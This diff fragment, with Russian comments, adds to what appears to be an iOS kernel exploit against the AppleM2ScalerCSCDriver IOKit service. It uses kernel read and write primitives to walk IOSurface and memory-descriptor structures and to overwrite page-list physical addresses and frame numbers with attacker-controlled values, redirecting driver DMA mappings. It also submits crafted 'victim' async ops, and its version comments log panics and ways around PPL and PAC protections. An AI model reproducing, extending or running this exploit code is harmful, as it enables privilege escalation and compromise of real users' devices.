+        // совпадает и в ЧУЖИХ страницах (pmap/pv/PT-структуры хранят PA-значения),
+        // патч не туда = PPL-нарушение = тихий ресет (1.9.223 ×2, 1.9.229). Скан
+        // остаётся диагностикой, записей ноль. Основной путь — OPC-цепь (оффсеты,
+        // безопасные zone-чтения, без охоты по значениям). Хиты НЕ патчим.
+        // 1.9.246: нуллификатор ЩАДИТ форму 5 — EARLY-хиты живут в retry и restore.
+        for (int i = 0; i < nDep; i++) if (hitForm[i] != 5) hitForm[i] = -1;
+    }
+    // 1.9.198: VA-FIELD DEPUTY — 1.9.197 доказал: prepare считает PA = vtophys
+    // (kernel VA буфера) на лету (слот откатился в ОРИГИНАЛ при пропатченных
+    // pfn-хранилищах — источник = трансляция, не хранилище). Патчим само
+    // VA-поле: ищем в plane-desc/rangeObj/surf указатель P с [P] == маркер
+    // пикселей dst (контент-проверка, walker не нужен) и подменяем на ctlKVA:
+    // prepare посчитает vtophys(ctlKVA)=ctlPA и драйвер сам запишет PTE.
+    // Оригинал возвращаем после execute (teardown-safety).
+    uint64_t vaFldObj = 0, vaFldOld = 0;
+    uint32_t vaFldOff = 0;
+    kpNote(r, @"  [PH] VAD (VA-field deputy) — старт");   // 1.9.244 крошка фаз
+    if (ctlKVA) {
+        uint64_t pd198 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;   // plane(+0x30) — как в pd-дампе
+        uint64_t pools198[16] = { pd198, surfVA ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0, surfVA };
+        uint32_t poolSz198[16] = { 0x200, 0x100, 0x200 };
+        int npool198 = 3;
+        // 1.9.199: + pointee-уровень plane-desc (IOMD sub-objects), кап 12
+        if (kpLooksLikeKernelPointer(pd198)) {
+            for (uint32_t o = 0; o + 8 <= 0x200 && npool198 < 15; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(pd198 + o));
+                if (!kpLooksLikeKernelPointer(Q)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < npool198; j++) if (pools198[j] == Q) { dup = YES; break; }
+                if (dup) continue;
+                pools198[npool198] = Q; poolSz198[npool198] = 0x100; npool198++;
+                if (npool198 >= 15) break;
+            }
+        }
+        int nFld199 = 0, nSkipPM = 0, nVHits = 0;
+        // 1.9.201: physmap-указатели проверяем по ЗНАЧЕНИЮ (P≈backKVA) — без единого
+        // контент-чтения (PPL-страница в типе 0x9 walker-гейт не ловит, рулетка
+        // запрещена). backKVA=phystokv(backingPA) уже посчитан выше. Патчим первый,
+        // остальные логируем — если prepare читает другой, следующий билд возьмёт его.
+        for (int pi = 0; pi < npool198 && !vaFldObj; pi++) {
+            uint64_t obj = pools198[pi];
+            if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+            for (uint32_t o = 0; o + 8 <= poolSz198[pi] && !vaFldObj; o += 8) {
+                uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                if (!kpLooksLikeKernelPointer(P)) continue;
+                if (backKVA && P >= backKVA && P < backKVA + 0x4000) {
+                    if (nVHits > 0) {
+                        kpNote(r, [NSString stringWithFormat:@"  [VAD] ещё кандидат окна: pool%d+%#x = %#llx", pi, o, (unsigned long long)P]);
+                    } else {
+                        vaFldObj = obj; vaFldOff = o; vaFldOld = P;
+                        kpNote(r, [NSString stringWithFormat:@"  [VAD] ★ VA-поле буфера (ЗНАЧЕНИЕ): pool%d+%#x = %#llx == backKVA окно — подмена на ctlKVA %#llx",
+                                  pi, o, (unsigned long long)P, (unsigned long long)ctlKVA]);
+                        early_kwrite64(obj + o, ctlKVA + (P - backKVA));
+                        uint64_t rb3 = early_kread64(obj + o);
+                        kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb3,
+                                  rb3 == ctlKVA + (P - backKVA) ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    }
+                    nVHits++;
+                }
+            }
+        }
+        // + второй уровень: pointees rangeObj (поле может жить глубже)
+        if (!vaFldObj && npool198 > 1 && kpLooksLikeKernelPointer(pools198[1])) {
+            for (uint32_t o = 0; o + 8 <= 0x100 && npool198 < 16; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(pools198[1] + o));
+                if (!kpLooksLikeKernelPointer(Q)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < npool198; j++) if (pools198[j] == Q) { dup = YES; break; }
+                if (dup) continue;
+                pools198[npool198] = Q; poolSz198[npool198] = 0x100; npool198++;
+            }
+        }
+        for (int pi = 0; pi < npool198 && !vaFldObj; pi++) {
+            uint64_t obj = pools198[pi];
+            if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+            for (uint32_t o = 0; o + 8 <= poolSz198[pi] && !vaFldObj; o += 8) {
+                uint64_t P = kp_untag_ptr(early_kread64(obj + o));
+                if (!kpLooksLikeKernelPointer(P)) continue;
+                // 1.9.200: контент-читаем ТОЛЬКО zone-map (0xffffffd0…–0xffffffef…):
+                // буфер поверхности живёт там; physmap-полоса (0xfffffff0…) —
+                // смертельные страницы (far=0xfffffff033e99c10, паника 03:33).
+                BOOL zoneBand = (P >= 0xffffffd000000000ULL && P < 0xfffffff000000000ULL);
+                if (!zoneBand) { nSkipPM++; continue; }
+                nFld199++;
+                uint64_t v = early_kread64(P);
+                if ((uint32_t)v != 0x41544159) continue;   // маркер пикселей dst
+                vaFldObj = obj; vaFldOff = o; vaFldOld = P;
+                kpNote(r, [NSString stringWithFormat:@"  [VAD] ★ VA-поле буфера: pool%d+%#x = %#llx ([P]=%#x маркер!) — подмена на ctlKVA %#llx",
+                          pi, o, (unsigned long long)P, (uint32_t)v, (unsigned long long)ctlKVA]);
+                early_kwrite64(obj + o, ctlKVA);
+                uint64_t rb3 = early_kread64(obj + o);
+                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb3,
+                          rb3 == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+            }
+        }
+        if (!vaFldObj) kpNote(r, [NSString stringWithFormat:@"  [VAD] VA-поле не найдено (пулов=%d, полей проверено=%d, physmap-скип=%d) — следующий шаг: pv_head/второй уровень", npool198, nFld199, nSkipPM]);
+    }
+    // 1.9.202: PARENT-RANGES DEPUTY — 126 полей без указателя на буфер: plane-desc
+    // это page-list дескриптор, а его РОДИТЕЛЬ (+0x60) держит ranges-массив арены
+    // (lvl1-дамп: [+0x60]=arr, count=16384) в обычной VMEM-полосе (не physmap!).
+    // Prepare перестраивает sub-MD из родителя — патчим запись арены с нашим
+    // backingPA на ctlPA, и драйвер сам построит PTE. Оригинал вернём после execute.
+    uint64_t parHitArr = 0, parHitOld = 0;
+    uint32_t parHitOff = 0;
+    kpNote(r, @"  [PH] PAR (parent-ranges) — старт");   // 1.9.244 крошка фаз
+    {
+        uint64_t pd202 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t parentMD = (kpLooksLikeKernelPointer(pd202) && kpSafeToRead(pd202)) ? kp_untag_ptr(early_kread64(pd202 + 0x60)) : 0;
+        uint64_t arr = 0;
+        uint32_t cnt = 0;
+        if (kpLooksLikeKernelPointer(parentMD) && kpSafeToRead(parentMD)) {
+            arr = kp_untag_ptr(early_kread64(parentMD + 0x60));
+            cnt = (uint32_t)early_kread64(parentMD + 0x68);
+            if (cnt > 0x8000) cnt = 0x8000;
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [PAR] parentMD=%#llx arr=%#llx count=%u", (unsigned long long)parentMD, (unsigned long long)arr, cnt]);
+        if (kpLooksLikeKernelPointer(arr)) {
+            int nDump = 0;
+            for (uint32_t i = 0; i < cnt && !parHitArr; i++) {
+                uint64_t e0 = early_kread64(arr + (uint64_t)i * 16);
+                uint64_t e1 = early_kread64(arr + (uint64_t)i * 16 + 8);
+                if (nDump < 6 && (e0 || e1)) {
+                    kpNote(r, [NSString stringWithFormat:@"    [PAR] [%u]: start=%#018llx len=%#018llx", i, (unsigned long long)e0, (unsigned long long)e1]);
+                    nDump++;
+                }
+                if (e0 == backingPA || (e0 && e1 && backingPA >= e0 && backingPA < e0 + e1)) {
+                    parHitArr = arr; parHitOff = (uint32_t)i * 16; parHitOld = e0;
+                    kpNote(r, [NSString stringWithFormat:@"  [PAR] ★ запись арены [%u]: start=%#018llx len=%#llx — подмена на ctlPA %#llx",
+                              i, (unsigned long long)e0, (unsigned long long)e1, (unsigned long long)ctlPA]);
+                    early_kwrite64(arr + (uint64_t)i * 16, ctlPA);
+                    uint64_t rb5 = early_kread64(arr + (uint64_t)i * 16);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb5,
+                              rb5 == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                }
+            }
+            if (!parHitArr) kpNote(r, @"  [PAR] записи с backingPA в арене нет — источник глубже (pv_head?)");
+        }
+    }
+    // 1.9.204 (agent-45 р.52): ИСТОЧНИК ОТКАТА найден статикой — фабрика 0x86f3b34
+    // при каждом execute делает VM-резолюцию backing VA→PA (0x80d9304 по контексту
+    // [0x7b33f28]) и пересобирает дескриптор (0x86eb7cc: +0x98/+0x9c из spec+0x58).
+    // PATCH-POINT: [planeDesc+0xb8] = целевая VA. У нас +0xb8=0 (ranges-based desc)
+    // — проверяем/пробуем, плюс дампим VM-контекст и ищем VA-поле в НЕ-kernel
+    // формах (arena/юзер VA без 0xffffff — раньше отбрасывались фильтром).
+    {
+        uint64_t pd204 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        if (kpLooksLikeKernelPointer(pd204) && kpSafeToRead(pd204)) {
+            uint64_t b8 = early_kread64(pd204 + 0xb8);
+            kpNote(r, [NSString stringWithFormat:@"  [VDB] [planeDesc+0xb8] = %#018llx%@", (unsigned long long)b8,
+                      b8 ? @" — поле живое" : @" (ноль — ranges-based)"]);
+            if (b8 && kpLooksLikeKernelPointer(b8) && ctlKVA) {
+                uint64_t vb = early_kread64(b8);
+                kpNote(r, [NSString stringWithFormat:@"  [VDB] контент [b8]: %#018llx%@", (unsigned long long)vb,
+                          (uint32_t)vb == 0x41544159 ? @" ← МАРКЕР, поле то самое" : @""]);
+                if ((uint32_t)vb == 0x41544159) {
+                    early_kwrite64(pd204 + 0xb8, ctlKVA);
+                    uint64_t rb7 = early_kread64(pd204 + 0xb8);
+                    kpNote(r, [NSString stringWithFormat:@"  [VDB] ★ подмена [pd+0xb8] → ctlKVA: readback %#018llx — %@",
+                              (unsigned long long)rb7, rb7 == ctlKVA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                    vaFldObj = pd204; vaFldOff = 0xb8; vaFldOld = b8;   // restore общим путём
+                }
+            }
+        }
+        // дамп глобального VM-контекста [0x7b33f28] (арена-аллокатор фабрики)
+        uint64_t ks204 = kconstant(base) - 0xfffffff007004000ULL;
+        uint64_t ctxSym = 0xfffffff007b33f28ULL + ks204;
+        uint64_t vmctx = early_kread64(ctxSym);
+        kpNote(r, [NSString stringWithFormat:@"  [VDB] vmctx [0x7b33f28]=%#llx (sym %#llx)", (unsigned long long)vmctx, (unsigned long long)ctxSym]);
+        if (kpLooksLikeKernelPointer(vmctx) && kpSafeToRead(vmctx)) {
+            for (uint32_t o = 0; o + 8 <= 0x200; o += 8) {
+                uint64_t q = early_kread64(vmctx + o);
+                if (!q) continue;
+                const char *tag = "";
+                if (q == backingPA) tag = " ← backingPA!";
+                else if (q == backKVA) tag = " ← backKVA!";
+                else if ((uint32_t)(q >> 32) == (uint32_t)(backingPA >> 14) || (uint32_t)q == (uint32_t)(backingPA >> 14)) tag = " ← pfn!";
+                else if (q == (uint64_t)pix) tag = " ← pix user VA!";
+                kpNote(r, [NSString stringWithFormat:@"    vmctx+%#x: %#018llx%s", o, (unsigned long long)q, tag]);
+            }
+        }
+    }
+    // 1.9.205: VDB2 — (а) pointees surface (уровень 1) с маркер-чеком в zone-полосе;
+    // (б) НЕ-kernel qword'ы surf/pd/rangeObj с тегами: backingPA/pfn/pixVA/arena-
+    // подобные [0x10000000..0x1000000000) — VA-формы без 0xffffff-префикса, которые
+    // kernel-pointer фильтр отбрасывал всю дорогу (как 0x84f574000 в 1.9.202).
+    {
+        int nMark205 = 0;
+        if (kpLooksLikeKernelPointer(surfVA) && kpSafeToRead(surfVA)) {
+            for (uint32_t o = 0; o + 8 <= 0x200 && !vaFldObj; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(surfVA + o));
+                if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                for (uint32_t o2 = 0; o2 + 8 <= 0x100 && !vaFldObj; o2 += 8) {
+                    uint64_t P = kp_untag_ptr(early_kread64(Q + o2));
+                    if (!kpLooksLikeKernelPointer(P)) continue;
+                    BOOL zoneBand = (P >= 0xffffffd000000000ULL && P < 0xfffffff000000000ULL);
+                    if (!zoneBand) continue;
+                    uint64_t v = early_kread64(P);
+                    if ((uint32_t)v != 0x41544159) continue;
+                    nMark205++;
+                    kpNote(r, [NSString stringWithFormat:@"  [VDB2] ★ маркер через surf+%#x→%#llx+%#x = %#llx",
+                              o, (unsigned long long)Q, o2, (unsigned long long)P]);
+                }
+            }
+        }
+        kpNote(r, [NSString stringWithFormat:@"  [VDB2] маркер-hits по surf-pointees: %d", nMark205]);
+        // (б) не-kernel qword'ы с тегами
+        uint64_t pd205 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t ro205 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x178)) : 0;
+        uint64_t objs205[3] = { surfVA, pd205, ro205 };
+        uint32_t szs205[3] = { 0x400, 0x100, 0x100 };
+        const char *names205[3] = { "surf", "pd", "rangeObj" };
+        int nDump205 = 0;
+        for (int oi = 0; oi < 3 && nDump205 < 48; oi++) {
+            uint64_t obj = objs205[oi];
+            if (!kpLooksLikeKernelPointer(obj) || !kpSafeToRead(obj)) continue;
+            for (uint32_t o = 0; o + 8 <= szs205[oi] && nDump205 < 48; o += 8) {
+                uint64_t q = early_kread64(obj + o);
+                if (q < 0x100000ULL || q >= 0x40000000000ULL) continue;
+                if (kpLooksLikeKernelPointer(q)) continue;
+                const char *tag = "";
+                if (q == backingPA) tag = " ← backingPA!";
+                else if ((uint32_t)q == pfn32 || (uint32_t)(q >> 32) == pfn32 || q == (uint64_t)pfn32) tag = " ← pfn!";
+                else if (q == (uint64_t)pix) tag = " ← pix user VA!";
+                else if (q >= 0x10000000ULL && q < 0x1000000000ULL) tag = " (arena?)";
+                else if (q >= 0x100000000ULL && q < 0x40000000000ULL) tag = " (PA?)";
+                kpNote(r, [NSString stringWithFormat:@"    %s+%#x: %#018llx%s", names205[oi], o, (unsigned long long)q, tag]);
+                nDump205++;
+            }
+        }
+    }
+    // 1.9.207 (р.53): два носителя базы offset-0. A: [pd+0x28] — wire token
+    // (pacda-signed disc 0x5ef8 — ТОЛЬКО ЧИТАЕМ, запись = паника на autda).
+    // B: [pd+0x90]→+0x10=records→record[0]+0x00 = owner-MD — его ranges держат
+    // базу == backingPA; патчим её на ctlPA (plain data, без PAC) → rewriter
+    // 0x86eb7cc скопирует в desc+0x9c при execute → DART замапит ctlPA.
+    uint64_t ownHitArr = 0, ownHitOld = 0;
+    uint32_t ownHitOff = 0;
+    kpNote(r, @"  [PH] OWN (owner-MD база) — старт");   // 1.9.244 крошка фаз
+    {
+        uint64_t pd207 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        if (kpLooksLikeKernelPointer(pd207) && kpSafeToRead(pd207)) {
+            // A — верификация токена (без записи!)
+            uint64_t tok = kp_untag_ptr(early_kread64(pd207 + 0x28));
+            uint64_t tokv = kpLooksLikeKernelPointer(tok) ? early_kread64(tok) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [OWN] A: [pd+0x28]=%#llx [P]=%#x%@ (signed — не пишем)",
+                      (unsigned long long)tok, (uint32_t)tokv,
+                      (uint32_t)tokv == 0x41544159 ? @" ← МАРКЕР, токен и есть backing VA" : @""]);
+            // B — цепочка к owner-MD
+            uint64_t ro207 = kp_untag_ptr(early_kread64(pd207 + 0x90));
+            uint64_t recs = (kpLooksLikeKernelPointer(ro207) && kpSafeToRead(ro207)) ? kp_untag_ptr(early_kread64(ro207 + 0x10)) : 0;
+            uint64_t ownerMD = (kpLooksLikeKernelPointer(recs) && kpSafeToRead(recs)) ? kp_untag_ptr(early_kread64(recs + 0)) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [OWN] B: [pd+0x90]=%#llx recs=%#llx ownerMD=%#llx",
+                      (unsigned long long)ro207, (unsigned long long)recs, (unsigned long long)ownerMD]);
+            if (kpLooksLikeKernelPointer(ownerMD) && kpSafeToRead(ownerMD)) {
+                // охота базы offset-0: поля ownerMD + его ranges-массив
+                uint64_t cand[16]; uint32_t candOff[16]; int nCand = 0;
+                for (uint32_t o = 0; o + 8 <= 0x100 && nCand < 16; o += 8) {
+                    uint64_t q = early_kread64(ownerMD + o);
+                    if (q == backingPA || (uint32_t)(q >> 32) == pfn32 || (uint32_t)q == pfn32) {
+                        cand[nCand] = q; candOff[nCand] = o; nCand++;
+                        kpNote(r, [NSString stringWithFormat:@"    [OWN] ownerMD+%#x: %#018llx ← база?", o, (unsigned long long)q]);
+                    }
+                }
+                uint64_t oarr = kp_untag_ptr(early_kread64(ownerMD + 0x60));
+                uint32_t ocnt = (uint32_t)early_kread64(ownerMD + 0x68);
+                if (ocnt > 0x4000) ocnt = 0x4000;
+                kpNote(r, [NSString stringWithFormat:@"    [OWN] owner ranges=%#llx count=%u", (unsigned long long)oarr, ocnt]);
+                if (kpLooksLikeKernelPointer(oarr)) {
+                    for (uint32_t i = 0; i < ocnt && !ownHitArr; i++) {
+                        uint64_t e0 = early_kread64(oarr + (uint64_t)i * 16);
+                        if (e0 == backingPA || (uint32_t)(e0 >> 32) == pfn32 || (uint32_t)e0 == pfn32) {
+                            ownHitArr = oarr; ownHitOff = (uint32_t)i * 16; ownHitOld = e0;
+                            uint64_t nq = (e0 == backingPA) ? ctlPA
+                                        : ((uint32_t)(e0 >> 32) == pfn32) ? (((uint64_t)ctlPFN << 32) | (e0 & 0xffffffffULL))
+                                        : ((e0 & 0xffffffff00000000ULL) | ctlPFN);
+                            kpNote(r, [NSString stringWithFormat:@"  [OWN] ★ база offset-0 @ ranges[%u]: %#018llx → %#018llx",
+                                      i, (unsigned long long)e0, (unsigned long long)nq]);
+                            early_kwrite64(oarr + (uint64_t)i * 16, nq);
+                            uint64_t rb8 = early_kread64(oarr + (uint64_t)i * 16);
+                            kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb8, rb8 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                        }
+                    }
+                }
+                if (!ownHitArr && nCand) {
+                    // база в поле ownerMD напрямую
+                    ownHitArr = ownerMD; ownHitOff = candOff[0]; ownHitOld = cand[0];
+                    uint64_t nq = (cand[0] == backingPA) ? ctlPA
+                                : ((uint32_t)(cand[0] >> 32) == pfn32) ? (((uint64_t)ctlPFN << 32) | (cand[0] & 0xffffffffULL))
+                                : ((cand[0] & 0xffffffff00000000ULL) | ctlPFN);
+                    kpNote(r, [NSString stringWithFormat:@"  [OWN] ★ база в поле ownerMD+%#x: %#018llx → %#018llx",
+                              candOff[0], (unsigned long long)cand[0], (unsigned long long)nq]);
+                    early_kwrite64(ownerMD + candOff[0], nq);
+                    uint64_t rb8 = early_kread64(ownerMD + candOff[0]);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb8, rb8 == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                }
+                if (!ownHitArr) kpNote(r, @"  [OWN] базы backingPA в ownerMD нет — носитель глубже");
+            }
+        }
+    }
+    // 1.9.211: RMD — детерминизм вместо лотереи DEP. Выигрыш 1.9.207 = отравление
+    // page-list записи ROOT-MD поверхности (голый pfn32 — авторитетный источник
+    // rewriter'а). Путь: [surf+0x30] plane sub-MD → [+0x60] родитель (root MD) →
+    // его указатели/массивы → запись == backingPA>>14 → ctlPFN. Без frame-type
+    // лотереи — прямо по цепочке объектов.
+    uint64_t rmdHitArr = 0, rmdHitOld = 0;
+    uint32_t rmdHitOff = 0;
+    kpNote(r, @"  [PH] RMD (root-MD page-list) — старт");   // 1.9.244 крошка фаз
+    {
+        uint64_t pd211 = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t rootMD = (kpLooksLikeKernelPointer(pd211) && kpSafeToRead(pd211)) ? kp_untag_ptr(early_kread64(pd211 + 0x60)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [RMD] pd=%#llx rootMD=%#llx", (unsigned long long)pd211, (unsigned long long)rootMD]);
+        if (kpLooksLikeKernelPointer(rootMD) && kpSafeToRead(rootMD)) {
+            // пулы: поля rootMD (до 8 kernel-указателей) — каждый кандидат-массив
+            uint64_t pools211[10]; uint32_t psz211[10]; int np211 = 0;
+            pools211[np211] = rootMD; psz211[np211] = 0x200; np211++;   // inline-поля тоже (page-list может быть inline)
+            for (uint32_t o = 0; o + 8 <= 0x100 && np211 < 9; o += 8) {
+                uint64_t Q = kp_untag_ptr(early_kread64(rootMD + o));
+                if (!kpLooksLikeKernelPointer(Q) || !kpSafeToRead(Q)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < np211; j++) if (pools211[j] == Q) { dup = YES; break; }
+                if (dup) continue;
+                pools211[np211] = Q; psz211[np211] = 0x400; np211++;
+            }
+            for (int pi = 0; pi < np211 && !rmdHitArr; pi++) {
+                for (uint32_t o = 0; o + 8 <= psz211[pi] && !rmdHitArr; o += 8) {
+                    uint64_t q = early_kread64(pools211[pi] + o);
+                    int frm = 0;
+                    if (q == backingPA) frm = 1;
+                    else if (q == (uint64_t)pfn32) frm = 2;
+                    else if ((uint32_t)(q >> 32) == pfn32 && (q & 0xffffffffULL) == 1) frm = 3;
+                    else if ((uint32_t)q == pfn32 && (q >> 32) && (q >> 32) <= 0x10) frm = 4;
+                    if (!frm) continue;
+                    rmdHitArr = pools211[pi]; rmdHitOff = o; rmdHitOld = q;
+                    uint64_t nq = (frm == 1) ? ((q & 0x3fffULL) | ctlPA)
+                                : (frm == 2) ? (uint64_t)ctlPFN
+                                : (frm == 3) ? (((uint64_t)ctlPFN << 32) | (q & 0xffffffffULL))
+                                : ((q & 0xffffffff00000000ULL) | ctlPFN);
+                    kpNote(r, [NSString stringWithFormat:@"  [RMD] ★ page-list запись pool%d+%#x форма%d: %#018llx → %#018llx",
+                              pi, o, frm, (unsigned long long)q, (unsigned long long)nq]);
+                    usleep(2000);
+                    early_kwrite64(pools211[pi] + o, nq);
+                    uint64_t rbA = early_kread64(pools211[pi] + o);
+                    kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rbA, rbA == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                }
+            }
+            if (!rmdHitArr) kpNote(r, @"  [RMD] записи pfn в цепочке rootMD нет — дамп его полей для разбора");
+        }
+    }
+    // 3. Trusted-path резолв surfVA через M2 async op-entry (1.9.124):
+    //    async submit резолвит surface ptr в op-entry БЕЗ execute/снапшота
+    //    (раунд 13: DVA-снапшот только при execute). Вся цепочка — из РЕАЛЬНЫХ
+    //    объектов (driver → scheduler → array → entry → surfVA → ranges):
+    //    никакого garbage-pointer роминга — zone-validator убивал ядро на
+    //    мусорных VA в примитиве (паники 172948/173443).
+    io_service_t svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                                                   IOServiceMatching("AppleM2ScalerCSCDriver"));
+    if (!svc) {
+        kpNote(r, @"  M2Scaler сервис не найден — SKIP");
+        free(ctl);
+        return r;
+    }
+    io_connect_t victim = IO_OBJECT_NULL, churn = IO_OBJECT_NULL;
+    kern_return_t vkr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
+    kern_return_t ckr2 = IOServiceOpen(svc, mach_task_self(), 0, &churn);
+    if (vkr != KERN_SUCCESS || !victim || ckr2 != KERN_SUCCESS || !churn) {
+        kpNote(r, [NSString stringWithFormat:@"  open victim/churn: kr=0x%x/0x%x — SKIP", vkr, ckr2]);
+        IOObjectRelease(svc);
+        free(ctl);
+        return r;
+    }
+    // 1.9.147: метим НАШИ оп-записи credit=0x10 через sel10 (до submit — credit
+    // per-client и копируется в каждую новую оп-запись). 0x10 — доказанно
+    // безопасный credit (чтение sched+0x128, mapped; гигантский = паника).
+    {
+        uint8_t s10[0x18];
+        memset(s10, 0, sizeof(s10));
+        *(uint32_t *)s10 = 0x10;
+        uint64_t sc3[3] = {0, 0, 0};
+        IOConnectCallMethod(victim, 10, sc3, 3, s10, 0x18, NULL, NULL, NULL, NULL);
+    }
+    // 3. Резолв через scheduler-массив (1.9.128): записи очереди несут dstS
+    //    (churn с теми же srcID/dstID); полный скан записи 0x21c0 — раунд 19:
+    //    surface ptr НЕ в заголовке, а в cfg/per-plane регионах 0x400+.
+    // backlog: churn держит workloop занятым ≈30-50мс (800 × ~40мкс).
+    // 1.9.142: churn на ОТДЕЛЬНЫХ поверхностях — churn-опы с srcID/dstID нашей
+    // dstS ИСПОЛНЯЛИ её и снапшотили оригинальный page-list ДО подмены (раунд
+    // 24: DVA-снапшот при первом EXECUTE). Churn держит очередь, не трогая dstS.
+    IOSurfaceRef churnSrc = IOSurfaceCreate((__bridge CFDictionaryRef)sp32);
+    IOSurfaceRef churnDst = IOSurfaceCreate((__bridge CFDictionaryRef)sp32);
+    uint32_t churnSrcID = churnSrc ? IOSurfaceGetID(churnSrc) : srcID;
+    uint32_t churnDstID = churnDst ? IOSurfaceGetID(churnDst) : dstID;
+    uint8_t tsdZ[KP_M2_TSD_SIZE];
+    memcpy(tsdZ, tsdGood, sizeof(tsdZ));   // 1.9.160: валидные churn-опы — нулевой TSD ошибался мгновенно, backlog не держался
+    *(uint32_t *)(tsdZ + 0) = churnSrcID;
+    *(uint32_t *)(tsdZ + 4) = churnDstID;
+    *(uint64_t *)(tsdZ + 8) = 1;   // async
+    for (int i = 0; i < 0; i++)   // 1.9.161: churn не нужен — подмена ДО submit (фаза 1), PTE патчится после execute #1 (фаза 2); 800 валидных опов держали очередь и victim#1 не успевал исполниться
+        IOConnectCallMethod(churn, 1, NULL, 0, tsdZ, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
+    // 1.9.181 (р.46): map-fail на 18.6 = kernel panic ПО ДИЗАЙНУ (0x2c2 не
+    // пробрасывается → ldr по НЕмапнутому cmd → NULL deref) — srcBad/уронить-map
+    // ЗАПРЕЩЕНЫ. victim#1 = НАСТОЯЩИЙ src: валидный identity-оп, mapping кэшится
+    // НА PIPE (не op-entry). DVA потом берём прямо оттуда.
+    uint8_t tsdV[0x1B0];
+    memcpy(tsdV, tsdGood, sizeof(tsdV));
+    *(uint32_t *)(tsdV + 0) = srcID;
+    *(uint32_t *)(tsdV + 4) = dstID;
+    *(uint64_t *)(tsdV + 8) = 1;   // async
+    kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
+    kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
+    // 1.9.222: SPEC-яд — голый pfn32 по +0x58 = ranges-spec rewriter'а (р.52/55:
+    // ldr w8,[x22,#0x58] → desc+0x9c). ПРЯМОЙ ПУТЬ (р.55): spec = [planeDesc+0x60],
+    // заполняется РАЗ при create, per-execute лишь перечитывается — патч стабилен.
+    // Все откаты: rewriter брал pfn из нетронутого spec+0x58. Выигрыш 1.9.207 — он.
+    uint64_t specVA[8], specOld[8];
+    int nSpec = 0;
+    {
+        uint64_t pdS = kpLooksLikeKernelPointer(surfVA) ? kp_untag_ptr(early_kread64(surfVA + 0x30)) : 0;
+        uint64_t specS = (kpLooksLikeKernelPointer(pdS) && kpSafeToRead(pdS)) ? kp_untag_ptr(early_kread64(pdS + 0x60)) : 0;
+        kpNote(r, [NSString stringWithFormat:@"  [SPC] pd=%#llx spec([pd+0x60])=%#llx", (unsigned long long)pdS, (unsigned long long)specS]);
+        if (kpLooksLikeKernelPointer(specS) && kpSafeToRead(specS)) {
+            uint64_t v = early_kread64(specS + 0x58);
+            kpNote(r, [NSString stringWithFormat:@"  [SPC] spec+0x58=%#018llx (ждём pfn32=%#x)", (unsigned long long)v, pfn32]);
+            if ((uint32_t)v == pfn32) {
+                uint64_t nq = (v & 0xffffffff00000000ULL) | ctlPFN;
+                kpNote(r, [NSString stringWithFormat:@"  [SPC] ★ ПРЯМОЙ spec+0x58: %#018llx → %#018llx", (unsigned long long)v, (unsigned long long)nq]);
+                usleep(2000);
+                early_kwrite64(specS + 0x58, nq);
+                uint64_t rb = early_kread64(specS + 0x58);
+                kpNote(r, [NSString stringWithFormat:@"      readback: %#018llx — %@", (unsigned long long)rb, rb == nq ? @"ПРИЛИПЛО" : @"МИМО"]);
+                specVA[nSpec] = specS + 0x58; specOld[nSpec] = v; nSpec++;
+            } else {
+                for (uint32_t o = 0; o + 8 <= 0x64; o += 8)
+                    kpNote(r, [NSString stringWithFormat:@"    spec+%#x: %#018llx", o, (unsigned long long)early_kread64(specS + o)]);
+            }
+        }
+        // fallback: охота по нодам (другие копии spec, если прямой путь пуст)
+        if (!nSpec) {
+            uint64_t vcS = kpM2TClientVA(r, isTable, victim, @"spc-victim");
